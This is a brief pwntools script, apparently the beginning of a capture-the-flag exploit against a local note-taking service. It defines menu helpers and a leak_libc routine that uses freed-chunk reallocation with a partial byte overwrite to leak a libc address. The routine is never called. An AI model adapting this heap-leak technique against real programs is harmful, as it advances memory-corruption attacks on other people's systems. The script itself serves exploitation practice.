#!/usr/bin/python

from pwn import *
from string import *

conn = remote("localhost",13337)

def listnote():
    conn.send("1\n")
    print(conn.recvuntil("0. "))

def newnote(x):
    conn.recvuntil("Your choice: ")
    conn.send("2\n")
    conn.recvuntil("Length of new note: ")
    conn.send(str(len(x)) + "\n")
    conn.recvuntil("Enter your note: ")
    conn.send(x)

def delnote(num):
    conn.send("4\n")
    conn.send(str(num) + '\n')
    conn.recvuntil("Your choice: ")

def leak_libc():
    len=128
    newnote("A"*len)
    newnote("B"*len)
    delnote(0)
    newnote("\xb8")
    listnote()

conn.close()
